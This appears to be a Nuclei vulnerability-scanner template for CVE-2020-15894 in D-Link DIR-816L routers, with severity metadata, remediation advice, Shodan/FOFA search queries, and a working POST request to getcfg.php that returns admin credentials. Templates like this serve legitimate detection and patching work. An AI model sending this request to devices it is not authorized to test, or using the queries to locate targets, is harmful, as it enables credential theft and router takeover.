id: CVE-2020-15894

info:
  name: D-Link DIR-816L getcfg.php Sensitive Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: An issue was discovered on D-Link DIR-816L devices 2.x before 1.10b04Beta02. There exists an exposed administration function in getcfg.php, which can be used to call various services. It can be utilized by an attacker to retrieve various sensitive information, such as admin login credentials, by setting the value of _POST_SERVICES in the query string to DEVICE.ACCOUNT.
  impact: |
    An attacker can exploit this vulnerability to access sensitive information, such as credentials, configuration details, and network settings.
  remediation: |
    Update the firmware to the latest version provided by D-Link to mitigate the CVE-2020-15894 vulnerability.
  reference:
    - https://research.loginsoft.com/bugs/multiple-vulnerabilities-discovered-in-the-d-link-firmware-dir-816l/
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-15894
    cwe-id: CWE-306
    epss-score: 0.00167
    epss-percentile: 0.54605
    cpe: cpe:2.3:o:dlink:dir-816l_firmware:2.06:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dir-816l_firmware
    shodan-query: http.html:"DIR-816L"
    fofa-query: body="dir-816l"

http:
  - method: POST
    path:
      - "{{BaseURL}}/getcfg.php"

    body: "SERVICES=DEVICE.ACCOUNT"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
    matchers:
      - type: word
        words:
          - "admin"
          - "password"
        part: body
        condition: and
